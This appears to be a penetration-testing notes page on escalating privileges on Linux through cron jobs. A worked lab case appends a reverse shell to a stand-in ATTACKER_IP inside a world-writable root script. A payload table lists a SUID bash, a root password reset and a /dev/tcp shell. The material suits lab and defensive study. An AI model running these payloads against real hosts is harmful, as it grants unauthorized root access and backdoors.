# Cron Jobs

A cron job is only a privilege escalation path when **two** facts hold at once. Either one alone is nothing:

```text
1. A job runs as a more privileged user (usually root)
2. You control something that job reads or executes
```

Fact 1 is enumeration. Fact 2 is the whole exercise, and it is almost never the cron entry itself — those are root-owned by design. It is the **script the entry points at**, or a directory that script reaches through.

> [!important]
> Every step below can come back empty, and empty almost never means "no job exists" here. Root's own crontab is mode 600 and unreadable to you by design, and `2>/dev/null` hides the denial that would have told you so. Read the **Empty** line in each section before you decide cron is closed on this host.

## Where the schedule is written down

```bash
cat /etc/crontab
```

```bash
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
```

```bash
crontab -l
```

```bash
ls -la /var/spool/cron/crontabs/
```

- `/etc/crontab` and `/etc/cron.d/` → the only cron files that carry a **user field** between the schedule and the command. Per-user crontabs do not, because the file's location already says whose they are. That field is what you are reading for.
- `crontab -l` → **your** jobs, and only yours. It never shows root's. Running it, seeing nothing, and concluding the host has no cron vector is the single most common way to walk past the answer on this whole page.
- `ls -la /var/spool/cron/crontabs/` → where the per-user files actually live. Expect to be refused; the refusal is the point, because it tells you jobs may exist that you cannot read.

## Which file in the directory is the planted one

```bash
ls -lat --time-style=long-iso /etc/cron.d/ /etc/cron.daily/
```

- `-t` → sort by mtime, newest first. This is the entire technique: the planted file rises to the top of its group and package files sink in date order below it.
- `--time-style=long-iso` → forces `YYYY-MM-DD HH:MM` on every line. Plain `ls -l` prints a clock for files under six months old and a **year** for older ones, so the two groups you are comparing are rendered in two different formats and the pattern disappears.
- `-a` → includes `.placeholder`, which is a stock empty file in every one of these directories and never the answer. Seeing it confirms you are reading the directory, not an error.

```text
drwxr-xr-x 2 root root 4096 2026-03-03 07:27 .
-rw-r--r-- 1 root root  139 2026-03-03 07:27 cleanup
-rw-r--r-- 1 root root  396 2024-01-09 06:39 sysstat
-rw-r--r-- 1 root root  201 2020-02-14 11:02 e2scrub_all
-rw-r--r-- 1 root root  102 2020-02-13 09:15 .placeholder
```

## The slash that decides which technique applies

```text
SHELL=/bin/bash
PATH=/home/ubuntu:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root /usr/local/bin/cleanup.sh
```

| Field | Here | What it buys you |
|---|---|---|
| Schedule | `* * * * *` | every minute — you wait 60s or less per attempt |
| User | `root` | fact 1, satisfied |
| Command | `/usr/local/bin/cleanup.sh` | **contains a `/`** — see below |

```text
root /usr/local/bin/cleanup.sh   ->  absolute path. PATH is NOT consulted to find it.
                                     Target the script's own permissions.

root cleanup.sh                  ->  bare name. PATH IS consulted, left to right.
                                     Plant a file of that name in a writable PATH entry.
```

The bare-name case is also what an **orphaned** entry looks like — an administrator deleted the script and left the schedule behind. A job that fires every minute calling a script that no longer exists is not a dead end; it is the finding, because cron will execute whatever you put where it looks.

A `PATH=` line at the top of the file is worth one glance even in the absolute-path case: it is the `PATH` the *script* will run under, so any bare command **inside** that script resolves through it. Mechanism for both cases: [[Linux-PATH-Abuse]].

## Whether you control anything the job touches

```bash
JOB=/usr/local/bin/cleanup.sh
```

```bash
ls -l "$JOB"; ls -ld "$(dirname "$JOB")"; head -40 "$JOB"
```

- `ls -ld` on the **directory** → the half people skip, and often the only half that is open. Write access to the directory lets you delete the script and create your own with the same name, even when the file itself is `root:root` mode `644` and untouchable.
- `head -40` → read it. A script you have not read cannot be paired with anything, and the interesting part is usually a bare command name or a `*` in the first ten lines.
- quoting `"$JOB"` → paths in cron entries contain spaces more often than you expect; unquoted, `ls` reports a missing file and you conclude the entry is orphaned when it is not.

## Worked case — a writable script behind a cron entry

**1. Stock `/etc/crontab`, empty periodic directories.** `cron.hourly`, `cron.weekly` and `cron.monthly` held only `.placeholder`; `cron.daily` held package scripts, all `root:root` and `644` or `755`. Nothing writable. That is a negative result, not a failure — it eliminates four directories and points the remaining attention at `/etc/cron.d/`.

**2. `/etc/cron.d/cleanup`** stood out on both mtime and name, exactly as the listing section describes.

**3. The entry itself is not the target.**

```bash
ls -la /etc/cron.d/cleanup
```

```bash
ls -ld /etc/cron.d
```

Root-owned, mode 644, in a directory you cannot write. An editor opens it and exits without saving — a silent failure that reads exactly like success. Confirm with `ls -la` afterwards: if the mtime has not moved, nothing was written.

**4. The script it points at.**

```bash
cat /usr/local/bin/cleanup.sh
```
```bash
#!/bin/bash
find /tmp -type f -mtime +1 -delete
```

```bash
find /var/tmp -type f -mtime +7 -delete
```

```bash
echo "[cleanup] done at $(date)"
```
```bash
ls -la /usr/local/bin/cleanup.sh
```

```bash
# -rwxrwxrwx 1 root root 122 Mar  3 07:27 /usr/local/bin/cleanup.sh
```

`rwxrwxrwx`, owned by root. Fact 2 satisfied: root executes this file every minute and anyone can rewrite it.

**5. Payload.** Cron gives the job no terminal, so an interactive shell would exit immediately. A reverse shell, appended rather than substituted:

```bash
cp /usr/local/bin/cleanup.sh /tmp/.cleanup.bak
cat >> /usr/local/bin/cleanup.sh << 'EOF'
bash -i >& /dev/tcp/ATTACKER_IP/6666 0>&1
EOF
nc -nlvp 6666
```

- `>>` not `>` → the script keeps doing its real job, so nothing on the host visibly breaks and the next tick still succeeds. Overwriting a live system script is how a lab box stops working halfway through.
- quoting the heredoc delimiter as `'EOF'` → stops your **local** shell expanding `$` and backticks before the file is written. Unquoted, `/dev/tcp/...` survives but anything else in the payload is evaluated on the wrong machine.
- the listener must be running **before** the minute ticks. Cron does not retry.

**6. The decoy.** That `PATH=/home/ubuntu:...` line is a real vector *shape* — `find` and `date` are both called bare-name inside the script, so a writable `/home/ubuntu` would mean planting `/home/ubuntu/find` and never touching the script at all. On this host it does not work:

```bash
ls -ld /home/ubuntu
```

```bash
# drwxr-xr-x 5 ubuntu ubuntu     <- you are john. not writable.
```

## Payload choice

| Payload | When |
|---|---|
| `bash -i >& /dev/tcp/IP/PORT 0>&1` | default. Cron has no terminal, so an interactive shell dies instantly |
| `chmod +s /bin/bash` then `/bin/bash -p` | no listener, no egress needed; leaves a SUID shell on disk |
| `echo "root:newpass" \| chpasswd` then `su` | when you want a stable credential rather than a shell |
| `cp /bin/bash /tmp/r; chmod +s /tmp/r` | same as above, out of the way of `/bin` |

`nc -e` is usually unavailable — the Debian and Ubuntu `netcat-openbsd` build omits it. Assume the bash `/dev/tcp` form unless you have checked. More options: [[Shells]].

> [!warning]
> `chpasswd` replaces the real root password: it locks out the legitimate administrator and is trivially visible in an audit. Prefer a payload that *adds* access rather than replacing a credential, and keep the backup you took in step 5.

## Finding jobs you cannot see

```bash
./pspy64 -pf -i 1000 | grep -v "UID=$(id -u)"
```

- `-f` → also print filesystem events. Noisy, but it shows *what the job touched*, which is often how you find the script when the command line itself is a wrapper.
- `-i 1000` → milliseconds between the unconditional `/proc` scans. The scan is a backstop; the inotify half is what actually catches short-lived processes.
- `grep -v "UID=$(id -u)"` → drops your own commands, which otherwise dominate the output and bury the two lines that matter.

## Timing

A cron path costs you the interval. A job that fires every minute is a fast win; one that fires daily is usually worth deprioritising against any direct credential — see [[Linux-Run-Sheet#8 — Stop and connect|run sheet step 8]]. On real engagements the daily, weekly and monthly jobs are the common case, and the every-minute job is the lab tell.
